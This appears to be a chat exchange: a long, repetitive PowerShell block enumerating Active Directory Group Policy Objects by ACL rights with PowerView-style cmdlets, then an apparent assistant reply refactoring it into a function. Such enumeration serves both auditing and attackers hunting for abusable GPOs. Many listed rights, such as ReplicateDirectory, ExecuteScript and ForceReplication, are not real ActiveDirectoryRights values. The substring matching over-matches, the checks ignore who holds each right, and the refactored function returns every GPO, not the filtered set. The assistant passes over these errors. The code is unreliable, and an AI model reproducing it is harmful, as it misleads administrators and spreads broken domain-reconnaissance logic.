$gposWithGenericAll = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericAll"}
}
$gposWithGenericAll

# Example of finding all GPOs with GenericWrite rights
$gposWithGenericWrite = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericWrite"}
}
$gposWithGenericWrite

# Example of finding all GPOs with GenericRead rights
$gposWithGenericRead = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericRead"}
}
$gposWithGenericRead

# Example of finding all GPOs with GenericExecute rights
$gposWithGenericExecute = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericExecute"}
}
$gposWithGenericExecute

# Example of finding all GPOs with WriteOwner rights
$gposWithWriteOwner = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "WriteOwner"}
}
$gposWithWriteOwner

# Example of finding all GPOs with WriteDacl rights
$gposWithWriteDacl = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "WriteDacl"}
}
$gposWithWriteDacl

# Example of finding all GPOs with Delete rights
$gposWithDelete = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "Delete"}
}
$gposWithDelete

# Example of finding all GPOs with DeleteChild rights
$gposWithDeleteChild = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteChild"}
}
$gposWithDeleteChild

# Example of finding all GPOs with AllExtendedRights rights
$gposWithAllExtendedRights = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "AllExtendedRights"}
}
$gposWithAllExtendedRights

# Example of finding all GPOs with ReplicateDirectory rights
$gposWithReplicateDirectory = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ReplicateDirectory"}
}
$gposWithReplicateDirectory

# Example of finding all GPOs with ListChildren rights
$gposWithListChildren = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ListChildren"}
}
$gposWithListChildren

# Example of finding all GPOs with ListObject rights
$gposWithListObject = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ListObject"}
}
$gposWithListObject

# Example of finding all GPOs with ListDirectory rights
$gposWithListDirectory = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ListDirectory"}
}
$gposWithListDirectory

# Example of finding all GPOs with CreateChild rights
$gposWithCreateChild = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateChild"}
}
$gposWithCreateChild

# Example of finding all GPOs with CreateGeneric rights
$gposWithCreateGeneric = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateGeneric"}
}
$gposWithCreateGeneric

# Example of finding all GPOs with CreateObject rights
$gposWithCreateObject = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateObject"}
}
$gposWithCreateObject

# Example of finding all GPOs with ExecuteScript rights
$gposWithExecuteScript = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ExecuteScript"}
}
$gposWithExecuteScript

# Example of finding all GPOs with CreateLink rights
$gposWithCreateLink = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateLink"}
}
$gposWithCreateLink

# Example of finding all GPOs with CreateAllExtended rights
$gposWithCreateAllExtended = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateAllExtended"}
}
$gposWithCreateAllExtended

# Example of finding all GPOs with WriteAllExtended rights
$gposWithWriteAllExtended = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "WriteAllExtended"}
}
$gposWithWriteAllExtended

# Example of finding all GPOs with DeleteAllExtended rights
$gposWithDeleteAllExtended = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteAllExtended"}
}
$gposWithDeleteAllExtended

# Example of finding all GPOs with DeleteSubtree rights
$gposWithDeleteSubtree = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteSubtree"}
}
$gposWithDeleteSubtree

# Example of finding all GPOs with DeleteTree rights
$gposWithDeleteTree = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteTree"}
}
$gposWithDeleteTree

# Example of finding all GPOs with ForceReplication rights
$gposWithForceReplication = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ForceReplication"}
}
$gposWithForceReplication

It looks like you have repetitive code that checks the Active Directory Rights of Group Policy Objects (GPOs) in your domain and filters them based on specific rights. To make this more manageable, we can refactor it into a single function or script.

Here's an example of how you could do this:

```powershell
# Function to find GPOs with specific Active Directory Rights
function Find-GPOSWithRights {
    param (
        [string[]]$rights,
        [switch]$all
    )

    $gpos = Get-DomainGPO

    foreach ($right in $rights) {
        $filteredGPOs = $gpos | Where-Object { (Get-DomainObjectACL -Identity $_.DN).ActiveDirectoryRights -match "$right" }
        
        if ($all) {
            Write-Output "GPOs with '$right' rights:"
            Write-Output $filteredGPOs
        } else {
            Write-Output ("{0} GPO(s) found with '{1}' rights." -f $filteredGPOs.Count, $right)
        }
    }

    return $gpos
}

# Example usage:
$rights = @("GenericAll", "WriteOwner", "DeleteChild")
Find-GPOSWithRights -rights $rights

# If you want to see all GPOs with the specified rights:
Find-GPOSWithRights -rights $rights -all
```

This script defines a function `Find-GPOSWithRights` that takes an array of Active Directory Rights and optionally outputs detailed information for each right.

### Explanation:

1. **Function Definition:**
   - The function `Find-GPOSWithRights` takes two parameters:
     - `$rights`: An array of Active Directory Rights you want to check.
     - `-all`: A switch parameter that controls whether the script should output all details about matching GPOs or just a summary count.

2. **Processing:**
   - The function retrieves all GPOs using `Get-DomainGPO`.
   - For each right in `$rights`, it filters the GPOs based on Active Directory Rights.
   - If the `-all` switch is used, it outputs detailed information about matching GPOs; otherwise, it just prints a count of matching GPOs.

3. **Example Usage:**
   - You can call the function with an array of rights and optionally use the `-all` switch to see all details for each right.

This approach makes your code more modular and easier to maintain. It also reduces redundancy by encapsulating repetitive logic into a single reusable function. 

If you have any specific requirements or additional features, feel free to adjust the script accordingly! 

Would you like further customization or help with integrating this into your existing scripts? Let me know! 🚀